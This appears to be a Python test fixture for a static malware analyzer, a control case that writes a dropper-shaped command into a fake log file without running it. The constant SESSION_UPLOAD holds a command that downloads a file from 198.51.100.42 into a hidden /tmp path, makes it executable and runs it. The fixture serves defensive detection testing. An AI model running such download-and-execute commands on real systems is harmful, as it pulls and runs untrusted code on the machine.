"""Static analyzer control. Never install or publish this fixture.

Dropper-shaped command outside a synth_* file, written only as log data.
Without process execution, the hidden-stage composites must stay suppressed.
"""
SESSION_UPLOAD = "wget http://198.51.100.42:8080/m -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m &"


def main():
    with open("fake_session.log", "w") as fh:
        fh.write("[00:00:01] DATA_RECV: " + SESSION_UPLOAD + "\n")


main()
